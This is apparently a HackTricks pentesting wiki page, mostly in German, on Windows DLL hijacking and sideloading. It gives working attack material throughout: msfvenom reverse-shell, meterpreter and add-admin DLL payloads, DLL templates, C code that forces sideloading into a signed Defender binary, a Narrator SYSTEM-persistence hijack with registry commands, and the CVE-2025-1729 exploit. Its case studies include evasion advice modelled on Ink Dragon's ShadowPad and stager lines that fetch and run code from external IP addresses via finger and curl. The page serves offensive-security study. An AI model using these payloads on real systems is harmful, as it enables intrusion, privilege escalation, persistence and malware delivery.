# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet das Manipulieren einer vertrauenswürdigen Anwendung, sodass sie eine bösartige DLL lädt. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für code execution, zum Erreichen von persistence und, seltener, für privilege escalation genutzt. Trotz des hierigen Fokus auf escalation bleibt die Hijacking-Methode über die Ziele hinweg konsistent.

### Übliche Techniken

Verschiedene Methoden werden für DLL hijacking eingesetzt; ihre Wirksamkeit hängt von der DLL-Lade-Strategie der Anwendung ab:

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der Original-DLL zu bewahren.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen DLL und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, da sie denkt, es handele sich um eine nicht vorhandene benötigte DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung zur bösartigen DLL zu leiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch eine bösartige Version im WinSxS-Verzeichnis — häufig mit DLL side-loading assoziiert.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich zu Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR configs und .NET implants auf DLL sideloading schichtet, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende Dlls finden

Die häufigste Methode, fehlende Dlls in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von sysinternals und das Setzen der folgenden 2 Filter:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn Sie allgemein nach fehlenden dlls suchen, lassen Sie dies für einige Sekunden laufen.\
Wenn Sie nach einer fehlenden dll in einer bestimmten ausführbaren Datei suchen, sollten Sie einen weiteren Filter setzen wie "Process Name" "contains" `<exec name>`, diese ausführen und die Ereigniserfassung stoppen.

## Exploiting Missing Dlls

Um privilege escalation zu erreichen, besteht unsere beste Chance darin, eine dll zu schreiben, die ein privilegierter Prozess zu laden versucht, an einem Ort, an dem sie durchsucht wird. Dadurch können wir eine dll in einem Ordner schreiben, in dem die dll vor dem Ordner gesucht wird, in dem sich die Original-dll befindet (seltsamer Fall), oder wir können in einem Ordner schreiben, in dem die dll gesucht wird, und die Original-dll existiert in keinem Ordner.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

Windows-Anwendungen suchen nach DLLs, indem sie einer Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge folgen. Das Problem von DLL hijacking tritt auf, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Gegenmaßnahme ist sicherzustellen, dass die Anwendung absolute Pfade für die benötigten DLLs verwendet.

Die DLL-Suchreihenfolge auf 32-Bit-Systemen sieht wie folgt aus:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die Standard-Suchreihenfolge mit aktiviertem SafeDllSearchMode. Wenn dieser deaktiviert ist, rückt das aktuelle Verzeichnis an die zweite Stelle. Um dieses Feature zu deaktivieren, erstellen Sie den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setzen ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das LoadLibraryEx lädt.

Beachten Sie abschließend, dass eine dll auch mit einem absoluten Pfad geladen werden kann anstatt nur mit dem Namen. In diesem Fall wird die dll nur in diesem Pfad gesucht (haben die dll Abhängigkeiten, werden diese so gesucht, als würden sie per Namen geladen).

Es gibt weitere Möglichkeiten, die Suchreihenfolge zu verändern, die hier aber nicht erklärt werden.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, die DLL-Suchpfade eines neu erstellten Prozesses deterministisch zu beeinflussen, ist das Setzen des DllPath-Feldes in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen ntdll-APIs. Wenn hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL per Namen auflöst (kein absoluter Pfad und ohne sichere Lade-Flags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Beispiel für den operativen Einsatz
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Ausnahmen zur DLL-Suchreihenfolge aus der Windows-Dokumentation

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Privilegien eskalieren

**Anforderungen**:

- Identifiziere einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontaler oder lateraler Bewegung) und dem **eine DLL fehlt**.
- Stelle sicher, dass **Schreibzugriff** für jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** **gesucht** wird. Dies kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, denn standardmäßig ist es ziemlich ungewöhnlich, ein privilegiertes executable zu finden, dem eine DLL fehlt, und noch ungewöhnlicher ist es, Schreibrechte in einem Ordner des Systempfads zu haben (standardmäßig hast du das nicht). Aber in falsch konfigurierten Umgebungen ist das möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, schau dir das Projekt [UACME](https://github.com/hfiref0x/UACME) an. Auch wenn **Hauptziel des Projekts ist bypass UAC**, findest du dort möglicherweise eine **PoC** einer Dll hijaking für die betreffende Windows-Version, die du nutzen kannst (wahrscheinlich nur, indem du den Pfad des Ordners änderst, in dem du Schreibrechte hast).

Beachte, dass du deine **Berechtigungen in einem Ordner prüfen kannst**, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Sie können auch die Imports einer ausführbaren Datei und die Exports einer dll mit folgendem Befehl prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren** mit Berechtigungen zum Schreiben in einem **System Path-Ordner** siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob du Schreibrechte in einem Ordner innerhalb des system PATH hast.\
Weitere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll_.

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eine der wichtigsten Maßnahmen, um es erfolgreich auszunutzen, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm von ihr importieren wird**. Beachte außerdem, dass Dll Hijacking praktisch ist, um [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ein Beispiel dafür, **wie man eine valide dll erstellt**, findest du in dieser dll hijacking-Studie, die sich auf dll hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du in der **nächsten Sektion** einige **einfache dll-Codes**, die als **Vorlagen** nützlich sein könnten oder zum Erstellen einer **dll mit nicht benötigten exportierten Funktionen**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die in der Lage ist, **beim Laden deinen bösartigen Code auszuführen**, aber auch als erwartet zu **exponieren** und **zu funktionieren**, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **ein ausführbares Programm angeben und die Bibliothek auswählen**, die du proxifizen möchtest, und eine **proxified dll** generieren oder **die Dll angeben** und eine **proxified dll** generieren.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Benutzer erstellen (x86 — ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren muss**, die vom Zielprozess geladen werden. Wenn diese Funktionen nicht existieren, wird das **binary** sie nicht laden können und der **exploit** wird fehlschlagen.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternative C-DLL mit thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die gehijackt werden kann, um beliebigen Code auszuführen und Persistenz zu erreichen.

Key facts
- Suchpfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn am OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL vorhanden ist, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exporte erforderlich.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Starten Sie Narrator und beobachten Sie den Ladeversuch des oben genannten Pfads.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- Benutzerkontext (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem Obigen lädt beim Start von Narrator die platzierte DLL. Auf dem sicheren Desktop (Anmeldebildschirm) STRG+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem sicheren Desktop ausgeführt.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Die Ausführung stoppt, wenn die RDP-Sitzung schließt—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf ein beliebiges binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Dadurch wird beliebige Ausführung unter dem Accessibility-Framework proxied.

Notes
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Die gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; keine Exports sind nötig.

## Fallstudie: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** im TrackPoint Quick Menu von Lenovo (`TPQMAssistant.exe`), dokumentiert als **CVE-2025-1729**.

### Details zur Schwachstelle

- **Komponente**: `TPQMAssistant.exe` befindet sich unter `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Geplanter Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 9:30 Uhr im Kontext des angemeldeten Benutzers.
- **Verzeichnisberechtigungen**: Schreibbar von `CREATOR OWNER`, was lokalen Benutzern erlaubt, beliebige Dateien abzulegen.
- **DLL-Suchverhalten**: Versucht zuerst, `hostfxr.dll` aus dem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", wenn sie fehlt, was auf Vorrang der lokalen Verzeichnissuche hinweist.

### Implementierung des Exploits

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stub in dasselbe Verzeichnis legen und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als normaler Benutzer `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Auf die Ausführung der geplanten Aufgabe um 9:30 AM im Kontext des aktuellen Benutzers warten.
3. Wenn ein Administrator angemeldet ist, wenn die Aufgabe ausgeführt wird, läuft die bösartige DLL in der Sitzung des Administrators mit mittlerer Integrität.
4. Standardmäßige UAC bypass techniques aneinanderreihen, um von mittlerer Integrität auf SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Bedrohungsakteure kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- Der Benutzer lädt ein MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge zuerst wsc.dll aus dem Arbeitsverzeichnis und führt Angreifer-Code unter einem signierten Elternprozess aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das im Hintergrund eine eingebettete Datei ausführt.
- In Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary untersuchen.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Lege diese zwei Dateien in denselben Ordner:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll mit Namen aus seinem Verzeichnis zu laden.
- wsc.dll: Angreifer-DLL. Wenn keine spezifischen Exporte benötigt werden, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten Exporte an die echte Bibliothek weiter, während das payload in DllMain ausgeführt wird.
- Erstelle ein minimales DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwenden Sie ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine weiterleitende DLL zu erzeugen, die auch Ihren payload ausführt.

- Diese Technik beruht auf der DLL-Namensauflösung durch das Host-Binary. Wenn das Host-Binary absolute Pfade oder sichere Lade-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann das Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Priorität beeinflussen und müssen bei der Auswahl des Host-Binaries und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer drei-Dateien-Triade einsetzt, um sich unter legitimer Software zu verstecken und gleichzeitig die Kern-Payload auf der Festplatte verschlüsselt zu halten:

1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen das Executable so um, dass es wie ein Windows-Binary aussieht (z. B. `conhost.exe`), die Authenticode-Signatur bleibt jedoch gültig.
2. **Malicious loader DLL** – wird neben dem EXE mit dem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise ein MFC-Binary, das mit dem ScatterBrain-Framework obfuskiert ist; ihre einzige Aufgabe ist es, das verschlüsselte Blob zu finden, es zu entschlüsseln und ShadowPad reflectively zu mappen.
3. **Encrypted payload blob** – wird oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem die entschlüsselte Payload im Speicher abgebildet wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu vernichten.

Tradecraft notes:

* Das Umbenennen der signierten EXE (während im PE-Header weiterhin der originale `OriginalFileName` steht) erlaubt es ihr, sich als Windows-Binary zu tarnen und trotzdem die Vendor-Signatur zu behalten. Replizieren Sie Ink Dragon’s Vorgehen, indem Sie `conhost.exe`-ähnliche Binaries ablegen, die in Wirklichkeit AMD/NVIDIA-Utilities sind.
* Weil das Executable vertraut bleibt, müssen die meisten allowlisting-Kontrollen nur Ihre bösartige DLL neben dem Signed-Parent akzeptieren. Konzentrieren Sie sich auf die Anpassung der loader DLL; das signierte Parent kann in der Regel unangetastet laufen.
* ShadowPad’s Decryptor erwartet, dass das TMP-Blob neben dem Loader liegt und beschreibbar ist, damit es die Datei nach dem Mapping nullen kann. Halten Sie das Verzeichnis beschreibbar, bis die Payload geladen ist; ist sie erst im Speicher, kann die TMP-Datei aus OPSEC-Gründen sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatoren koppeln DLL sideloading mit LOLBAS, sodass das einzige benutzerdefinierte Artefakt auf der Festplatte die bösartige DLL neben dem vertrauenswürdigen EXE ist:

- **Remote command loader (Finger):** Verstecktes PowerShell startet `cmd.exe /c`, holt Befehle von einem Finger-Server und piped sie an `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` holt TCP/79-Text; `| cmd` führt die Server-Antwort aus, wodurch Operatoren den second stage serverseitig rotieren lassen können.

- **Built-in download/extract:** Laden Sie ein Archiv mit einer harmlosen Extension herunter, entpacken Sie es und legen Sie das Sideload-Ziel plus DLL unter einem zufälligen `%LocalAppData%`-Ordner ab:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` versteckt den Fortschritt und folgt Redirects; `tar -xf` nutzt das in Windows eingebaute tar.

- **WMI/CIM launch:** Starten Sie das EXE über WMI, damit Telemetrie einen CIM-erstellten Prozess zeigt, während es die colocated DLL lädt:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funktioniert mit Binaries, die lokale DLLs bevorzugen (z. B. `intelbq.exe`, `nearby_share.exe`); die payload (z. B. Remcos) läuft unter dem vertrauenswürdigen Namen.

- **Hunting:** Alerten Sie auf `forfiles`, wenn `/p`, `/m` und `/c` zusammen auftreten; außerhalb von Admin-Skripten selten.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Eine kürzliche Lotus Blossom-Intrusion missbrauchte eine vertrauenswürdige Update-Kette, um einen NSIS-gepackten Dropper zu liefern, der einen DLL sideload und vollständig in-memory Payloads aufbaute.

Tradecraft flow
- `update.exe` (NSIS) erstellt `%AppData%\Bluetooth`, markiert es als **HIDDEN**, droppt ein umbenanntes Bitdefender Submission Wizard `BluetoothService.exe`, eine bösartige `log.dll` und ein verschlüsseltes Blob `BluetoothService`, und startet dann das EXE.
